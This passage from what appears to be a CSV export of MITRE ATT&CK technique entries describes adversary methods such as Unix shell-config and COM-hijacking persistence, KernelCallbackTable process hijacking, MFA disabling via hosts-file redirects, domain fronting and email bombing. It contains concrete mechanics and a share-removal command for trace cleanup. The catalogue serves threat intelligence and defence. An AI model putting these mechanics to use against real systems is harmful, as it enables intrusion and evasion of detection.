* <code>HKEY_CLASSES_ROOT\txtfile\shell\printto\command</code>

The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.(Citation: TrendMicro TROJ-FAKEAV OCT 2012)",Windows,FALSE,FALSE,2020-01-24T13:40:47Z
attack-pattern--9b00925a-7c4b-4e53-bfc8-9a6a806fde03,1,T1679,Selective Exclusion,"Adversaries may intentionally exclude certain files, folders, directories, file types, or system components from encryption or tampering during a ransomware or malicious payload execution. Some file extensions that adversaries may avoid encrypting include `.dll`, `.exe`, and `.lnk`.(Citation: Palo Alto Unit 42 Medusa Group Medusa Ransomware January 2024)  

Adversaries may perform this behavior to avoid alerting users, to evade detection by security tools and analysts, or, in the case of ransomware, to ensure that the system remains operational enough to deliver the ransom notice. 

Exclusions may target files and components whose corruption would cause instability, break core services, or immediately expose the attack. By carefully avoiding these areas, adversaries maintain system responsiveness while minimizing indicators that could trigger alarms or otherwise inhibit achieving their goals.",Windows,FALSE,FALSE,2025-09-25T14:45:54Z
attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36,1,T1212,Exploitation for Credential Access,"Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. 

Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)

Such exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)

Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.","Linux, Windows, macOS, Identity Provider",FALSE,FALSE,2018-04-18T17:59:24Z
attack-pattern--a29aa77c-a88d-4f19-bab9-7751941b2e2d,1,T1686.002,Network Device Firewall,"Adversaries may disable network device-based firewall mechanisms entirely or add, delete, or modify particular rules in order to bypass controls limiting network usage.  

Adversaries may obtain access to devices such as routers, switches, or other perimeter/network devices and change access control lists (ACLs), security zones, or policy rules to permit otherwise blocked traffic. For example, adversaries may add new network firewall rules to allow access to all internal network subnets without restrictions. Allowing access to internal network subsets may enable unrestricted inbound/outbound connectivity or open paths for command and control and lateral movement.

Adversaries may obtain access to network device management interfaces via [Valid Accounts](https://attack.mitre.org/techniques/T1078) or by exploiting vulnerabilities. In some cases, threat actors may target firewalls and other network infrastructure that are exposed to the internet by leveraging weaknesses in public-facing applications ([Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).(Citation: CVE-2024-55591 Detail)

Adversaries may also modify host networking configurations that indirectly manipulate system firewalls, such as adjusting interface bandwidth or network connection request thresholds.",Network Devices,FALSE,FALSE,2026-04-14T22:54:05Z
attack-pattern--a4657bc9-d22f-47d2-a7b7-dd6ec33f3dde,1,T1574.013,KernelCallbackTable,"Adversaries may abuse the <code>KernelCallbackTable</code> of a process to hijack its execution flow in order to run their own payloads.(Citation: Lazarus APT January 2022)(Citation: FinFisher exposed ) The <code>KernelCallbackTable</code> can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once <code>user32.dll</code> is loaded.(Citation: Windows Process Injection KernelCallbackTable)

An adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code> by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) or [Process Injection](https://attack.mitre.org/techniques/T1055) into another process.

A pointer to the memory address of the <code>KernelCallbackTable</code> can be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code> [Native API](https://attack.mitre.org/techniques/T1106) function).(Citation: NtQueryInformationProcess) Once the pointer is located, the <code>KernelCallbackTable</code> can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>) set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.(Citation: Lazarus APT January 2022)

The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code> may also be restored to its original state by the rest of the malicious payload.(Citation: Lazarus APT January 2022) Use of the <code>KernelCallbackTable</code> to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.",Windows,FALSE,FALSE,2022-02-25T15:27:44Z
attack-pattern--a51eb150-93b1-484b-a503-e51453b127a4,1,T1597,Search Closed Sources,"Adversaries may search and gather information about victims from closed (e.g., paid, private, or otherwise not freely available) sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.(Citation: ZDNET Selling Data)

Adversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",PRE,FALSE,FALSE,2020-10-02T17:01:42Z
attack-pattern--a750a9f6-0bde-4bb3-9aae-1e2786e9780c,1,T1070.005,Network Share Connection Removal,Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the <code>net use \\system\share /delete</code> command. (Citation: Technet Net Use),Windows,FALSE,FALSE,2020-01-31T12:39:18Z
attack-pattern--ac9e6b22-11bf-45d7-9181-c1cb08360931,1,T1565,Data Manipulation,"Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: Sygnia Elephant Beetle Jan 2022) By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.

The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.","Linux, macOS, Windows",FALSE,FALSE,2020-03-02T14:19:22Z
attack-pattern--ad255bfe-a9e6-4b52-a258-8d3462abe842,1,T1001,Data Obfuscation,"Adversaries may obfuscate command and control traffic to make it more difficult to detect.(Citation: Bitdefender FunnyDream Campaign November 2020) Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols.","ESXi, Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:30:18Z
attack-pattern--b0c74ef9-c61e-4986-88cb-78da98a355ec,1,T1204.003,Malicious Image,"Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware](https://attack.mitre.org/techniques/T1608/001), and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.(Citation: Summit Route Malicious AMIs)

Adversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Resource Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: Aqua Security Cloud Native Threat Report June 2021)","IaaS, Containers",FALSE,FALSE,2021-03-30T17:20:05Z
attack-pattern--b4409cd8-0da9-46e1-a401-a241afd4d1cc,1,T1556.006,Multi-Factor Authentication,"Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.

Once adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621), adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.(Citation: Mandiant APT42)(Citation: Azure AD Conditional Access Exclusions)

For example, modifying the Windows hosts file (`C:\windows\system32\drivers\etc\hosts`) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a ""fail open"" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA. (Citation: Russians Exploit Default MFA Protocol - CISA March 2022) 

Depending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.(Citation: Russians Exploit Default MFA Protocol - CISA March 2022)","IaaS, Identity Provider, Linux, macOS, Office Suite, SaaS, Windows",FALSE,FALSE,2022-05-31T19:31:38Z
attack-pattern--b63a34e8-0a61-4c97-a23b-bf8a2ed812e2,1,T1546.004,Unix Shell Configuration Modification,"Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user’s home directory (<code>~/</code>) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. 

Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files.(Citation: intezer-kaiji-malware)(Citation: bencane blog bashrc) These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when a user opens a command-line interface or connects remotely.(Citation: anomali-rocke-tactics)(Citation: Linux manual bash invocation) Since the system only executes the first existing file in the listed order, adversaries have used <code>~/.bash_profile</code> to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code> file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.(Citation: Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation: Magento) Some malware targets the termination of a program to trigger execution, adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session. 

For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation: code_persistence_zsh)(Citation: macOS MS office sandbox escape) The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.","Linux, macOS",FALSE,FALSE,2020-01-24T14:13:45Z
attack-pattern--b8017880-4b1e-42de-ad10-ae7ac6705166,1,T1599,Network Boundary Bridging,"Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.

Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.

When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) to achieve the same goals.(Citation: Kaspersky ThreatNeedle Feb 2021)  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",Network Devices,FALSE,FALSE,2020-10-19T16:08:29Z
attack-pattern--b83e166d-13d7-4b52-8677-dff90c548fd7,1,T1553,Subvert Trust Controls,"Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.

Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates)","Linux, macOS, Windows",FALSE,FALSE,2020-02-05T14:54:07Z
attack-pattern--bb5e59c4-abe7-40c7-8196-e373cb1e5974,1,T1566.004,Spearphishing Voice,"Adversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex: [Impersonation](https://attack.mitre.org/techniques/T1684/001)) and/or creating a sense of urgency or alarm for the recipient.

All forms of phishing are electronically delivered social engineering. In this scenario, adversaries are not directly sending malware to a victim vice relying on [User Execution](https://attack.mitre.org/techniques/T1204) for delivery and execution. For example, victims may receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools ([Remote Access Tools](https://attack.mitre.org/techniques/T1219)) onto their computer.(Citation: Unit42 Luna Moth)

Adversaries may also combine voice phishing with [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621) in order to trick users into divulging MFA credentials or accepting authentication prompts.(Citation: Proofpoint Vishing)","Linux, macOS, Windows, Identity Provider",FALSE,FALSE,2023-09-07T21:50:08Z
attack-pattern--bc0f5e80-91c0-4e04-9fbb-e4e332c85dae,1,T1546.015,Component Object Model Hijacking,"Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. 

Adversaries may use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. 

One variation of COM hijacking involves abusing Type Libraries (TypeLibs), which provide metadata about COM objects, such as their interfaces and methods. Adversaries may modify Registry keys associated with TypeLibs to redirect legitimate COM object functionality to malicious scripts or payloads. Unlike traditional COM hijacking, which commonly uses local DLLs, this variation may leverage the ""script:"" moniker to execute remote scripts hosted on external servers.(Citation: RELIAQUEST) This approach enables stealthy execution of code while maintaining persistence, as the remote payload would be automatically downloaded whenever the hijacked COM object is accessed.",Windows,FALSE,FALSE,2020-03-16T14:12:47Z
attack-pattern--bed81616-3dde-4685-be6e-ba9820f9a7ed,1,T1667,Email Bombing,"Adversaries may flood targeted email addresses with an overwhelming volume of messages. This may bury legitimate emails in a flood of spam and disrupt business operations.(Citation: sophos-bombing)(Citation: krebs-email-bombing)

An adversary may accomplish email bombing by leveraging an automated bot to register a targeted address for e-mail lists that do not validate new signups, such as online newsletters. The result can be a wave of thousands of e-mails that effectively overloads the victim’s inbox.(Citation: krebs-email-bombing)(Citation: hhs-email-bombing)

By sending hundreds or thousands of e-mails in quick succession, adversaries may successfully divert attention away from and bury legitimate messages including security alerts, daily business processes like help desk tickets and client correspondence, or ongoing scams.(Citation: hhs-email-bombing) This behavior can also be used as a tool of harassment.(Citation: krebs-email-bombing)

This behavior may be a precursor for [Spearphishing Voice](https://attack.mitre.org/techniques/T1566/004). For example, an adversary may email bomb a target and then follow up with a phone call to fraudulently offer assistance. This social engineering may lead to the use of [Remote Access Software](https://attack.mitre.org/techniques/T1663) to steal credentials, deploy ransomware, conduct [Financial Theft](https://attack.mitre.org/techniques/T1657)(Citation: sophos-bombing), or engage in other malicious activity.(Citation: rapid7-email-bombing)
","Linux, Office Suite, Windows, macOS",FALSE,FALSE,2025-01-31T14:39:58Z
attack-pattern--bf147104-abf9-4221-95d1-e81585859441,1,T1137.004,Outlook Home Page,"Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)

Once malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.(Citation: SensePost Outlook Home Page)
","Windows, Office Suite",FALSE,FALSE,2019-11-07T20:09:56Z
attack-pattern--c071d8c1-3b3a-4f22-9407-ca4e96921069,1,T1608.003,Install Digital Certificate,"Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.(Citation: DigiCert Install SSL Cert)

Adversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers. 

Adversaries can obtain digital certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) or create self-signed certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1587/003)). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).",PRE,FALSE,FALSE,2021-03-17T20:32:13Z
attack-pattern--c283d88f-8c23-4318-9da5-3d50cecad756,1,T1059.013,Container CLI/API,"Adversaries may abuse built-in CLI tools or API calls to execute malicious commands in containerized environments.

The Docker CLI is used for managing containers via an exposed API point from the `dockerd` daemon. Some common examples of Docker CLI include Docker Desktop CLI and Docker Compose, but users are also able to use SDKs to interact with the API. For example, Docker SDK for Python can be used to run commands within a Python application.(Citation: Docker Desktop CLI)

Adversaries may leverage the Docker CLI, API, or SDK to pull or build Docker images (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Build Image on Host](https://attack.mitre.org/techniques/T1612)), run containers (i.e., [Deploy Container](https://attack.mitre.org/techniques/T1610)), or execute commands inside running containers (i.e., [Container Administration Command](https://attack.mitre.org/techniques/T1609)). In some cases, threat actors may pull legitimate images that include scripts or tools that they can leverage - for example, using an image that includes the `curl` command to download payloads.(Citation: Intezer) Adversaries may also utilize `docker inspect` and `docker ps` to scan for cloud environment variables and other running containers (i.e., [Container and Resource Discovery](https://attack.mitre.org/techniques/T1613)).(Citation: Cisco Talos Blog)(Citation: aquasec)

Kubernetes is responsible for the management and orchestration of containers across clusters. The Kubernetes control plane, which manages the state of the cluster and is responsible for scheduling, communication, and resource monitoring, can be invoked directly via the API or indirectly via CLI tools such as `kubectl`. It may also be accessed within client libraries such as Go or Python. By utilizing the API, administrators can interact with resources within the cluster such as listing or creating pods, which is a group of one or more containers. Adversaries call the API server via `curl` or other tools, allowing them to obtain further information about the environment such as pods, deployments, daemonsets, namespaces, or sysvars.(Citation: aquasec) They may also run various commands regarding resource management.",Containers,FALSE,FALSE,2025-06-15T21:41:27Z
attack-pattern--c3c8c916-2f3c-4e71-94b2-240bdfc996f0,1,T1550.004,Web Session Cookie,"Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)

Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) or [Web Cookies](https://attack.mitre.org/techniques/T1606/001), the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.

There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)","IaaS, Office Suite, SaaS",FALSE,FALSE,2020-01-30T17:48:49Z
attack-pattern--c675646d-e204-4aa8-978d-e3d6d65885c4,1,T1499,Endpoint Denial of Service,"Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)

An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).

To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.

Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.

Botnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)

In cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)

For attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).
","Windows, Linux, macOS, Containers, IaaS",FALSE,FALSE,2019-04-18T11:00:55Z
attack-pattern--ca9d3402-ada3-484d-876a-d717bd6e05f2,1,T1090.004,Domain Fronting,"Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, ""domainless"" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).

For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.","Linux, macOS, Windows, ESXi",FALSE,FALSE,2020-03-14T23:29:19Z
attack-pattern--cc7b8c4e-9be0-47ca-b0bb-83915ec3ee2f,1,T1132,Data Encoding,"Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.","ESXi, Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:31:43Z
attack-pattern--cc89ecbd-3d33-4a41-bcca-001e702d18fd,1,T1546.010,AppInit DLLs,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> or <code>HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Elastic Process Injection July 2017)

Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. 

The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)",Windows,FALSE,FALSE,2020-01-24T14:52:25Z
attack-pattern--d0613359-5781-4fd2-b5be-c269270be1f6,1,T1565.002,Transmitted Data Manipulation,"Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.

Manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.","Linux, macOS, Windows",FALSE,FALSE,2020-03-02T14:27:00Z
attack-pattern--d10cbd34-42e3-45c0-84d2-535a09849584,1,T1543.001,Launch Agent,"Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.(Citation: AppleDocs Launch Agent Daemons)(Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware) Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time.(Citation: OSX.Dok Malware) Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.

 Launch Agents can also be executed using the [Launchctl](https://attack.mitre.org/techniques/T1569/001) command.
 
Adversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>.(Citation: Sofacy Komplex Trojan)(Citation: Methods of Mac Malware Persistence) The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.(Citation: OSX Malware Detection)(Citation: OceanLotus for OS X)",macOS,FALSE,FALSE,2020-01-17T16:10:58Z
attack-pattern--d21bb61f-08ad-4dc1-b001-81ca6cb79954,1,T1650,Acquire Access,"Adversaries may purchase or otherwise acquire an existing access to a target system or network. A variety of online services and initial access broker networks are available to sell access to previously compromised systems.(Citation: Microsoft Ransomware as a Service)(Citation: CrowdStrike Access Brokers)(Citation: Krebs Access Brokers Fortune 500) In some cases, adversary groups may form partnerships to share compromised systems with each other.(Citation: CISA Karakurt 2022)

Footholds to compromised systems may take a variety of forms, such as access to planted backdoors (e.g., [Web Shell](https://attack.mitre.org/techniques/T1505/003)) or established access via [External Remote Services](https://attack.mitre.org/techniques/T1133). In some cases, access brokers will implant compromised systems with a “load” that can be used to install additional malware for paying customers.(Citation: Microsoft Ransomware as a Service)

